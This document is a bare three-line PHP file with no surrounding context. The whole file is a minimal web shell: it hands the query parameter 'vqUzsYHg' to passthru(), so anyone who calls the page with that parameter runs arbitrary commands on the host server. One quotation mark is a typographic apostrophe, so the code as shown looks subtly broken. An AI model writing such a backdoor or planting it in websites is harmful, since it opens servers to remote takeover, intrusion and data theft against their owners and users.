<?php
passthru($_GET[’vqUzsYHg']);
?>
